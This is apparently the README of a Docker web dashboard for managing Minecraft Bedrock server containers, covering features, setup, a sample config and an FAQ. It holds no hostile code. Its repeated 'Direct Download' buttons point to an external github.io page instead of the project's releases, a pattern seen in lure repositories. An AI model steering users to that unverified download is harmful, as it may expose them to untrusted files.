# Minecraft Bedrock Server Manager v1.0 - server management dashboard 2026

> **Version 1.0 of Minecraft Bedrock Server Manager is a Docker-backed web console for Bedrock hosts: real-time operations, several instances under one roof, and direct access to configs.**

[![Platform](https://img.shields.io/badge/Platform-Docker%20web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/imueller64/bedrock-server-manager-dash?style=flat-square)](https://github.com/imueller64/bedrock-server-manager-dash)

---

<p align="center">
  <a href="https://imueller64.github.io/bedrock-server-manager-dash/">
    <img src="https://img.shields.io/badge/Download-Minecraft%20Bedrock%20Server%20Manager%20Latest-brightgreen?style=for-the-badge" alt="Download Minecraft Bedrock Server Manager">
  </a>
</p>

> **[Direct Download - Minecraft Bedrock Server Manager v1.0](https://imueller64.github.io/bedrock-server-manager-dash/)**

---

[Download Latest Build](https://imueller64.github.io/bedrock-server-manager-dash/)

---

## What is Minecraft Bedrock Server Manager?

Minecraft Bedrock Server Manager puts Bedrock container administration in a single browser UI. It targets ops who prefer one place to watch health, run start/stop style actions, and touch server files instead of juggling disconnected utilities.

Day-to-day work across several instances sits at the center of the design. A responsive layout, login protection, and fresh signals from the server side pull common chores together—container control, setting edits, status checks, backup restore, and add-on handling—without leaving the dashboard.

---

## What you can do

- Push live status over WebSocket links
- Run several Minecraft Bedrock instances from one panel
- Start, stop, or restart containers in the browser
- Drive the server with an in-browser console
- Change configs and walk the file tree via the built-in manager
- Keep Bedrock addon packs organized
- Snapshot worlds and bring them back when you need them
- Work from a responsive UI that is gated by a password

---

## Getting it running

1. Grab the project (download or clone):
   - `git clone https://github.com/imueller64/bedrock-server-manager-dash.git
2. Build or roll out the Docker app in your stack.
3. After the container is up, point a browser at the web UI.

For a prebuilt package, start the container, then open the dashboard on the address you exposed.

---

## Day-to-day use

With the UI loaded, pick the instance you care about and read its status. From that screen you can trigger runtime controls, drop into the console, browse files, or tweak configuration.

A common path:
1. Choose a Bedrock instance.
2. Confirm live status and container state.
3. Send commands from the console when that helps.
4. Handle worlds, backups, and addon packs in the matching panels.
5. Persist edits and restart the container if the server expects it.

---

## Configuration notes

Docker deployment plus the dashboard’s own config files cover most setup. Per-server options live with each managed instance, so UI edits stay scoped to that host.

Example configuration area:

    container:
      host: localhost
      port: 8080
      auth: enabled
    servers:
      - name: bedrock-1
      - name: bedrock-2

Tune host, port, auth, and instance names to match how you laid out containers and access.

---

## What you need

- An environment that can run Docker
- A browser to reach the dashboard
- Minecraft Bedrock server containers under management
- Disk room for worlds, backups, and addon packs
- Network reachability from the dashboard to those containers

---

## FAQ

**Where do updates and support material live?**  
Check the project’s release and repository pages for current builds and change notes.

**Is multi-server management supported?**  
Yes. The UI is built around controlling more than one Bedrock instance.

**How is configuration kept?**  
Through deployment files and the server data the dashboard owns for each instance.

**A server looks dead—what first?**  
Make sure the container is up, double-check dashboard connection settings, and confirm WebSocket and browser URLs match your deploy.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
